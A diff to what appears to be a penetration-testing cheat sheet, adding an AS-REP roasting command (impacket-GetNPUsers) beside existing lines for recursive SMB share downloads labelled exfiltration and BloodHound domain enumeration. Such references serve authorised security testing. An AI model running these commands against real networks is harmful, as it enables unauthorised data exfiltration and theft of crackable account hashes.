@@ -275,6 +275,8 @@ smbmap -u "<USER>" -p "<PASSWORD>" -H <IP> -R
 # exfiltration - smb - recursively download all files in a directory (domain is only needed if the user is a domain joined user)
 smbget -U <DOMAIN>\<USER> smb://<HOST>/<SHARE> -R
 
-# post-exploitation - bloodhound - enumerating the domain remotely
+# post-exploitation active -directory - bloodhound - enumerating the domain remotely
 bloodhound-python -u <USER>@<DOMAIN> -p '<PASSWORD>' -d <DOMAIN> -ns <NAMESERVER IP> --zip
 
+# post-exploitation - active directory - AS-REP roasting - checking for no preauth
+impacket-GetNPUsers -usersfile <USERS> -request -format john -dc-ip <DC IP> <DOMAIN>/ 
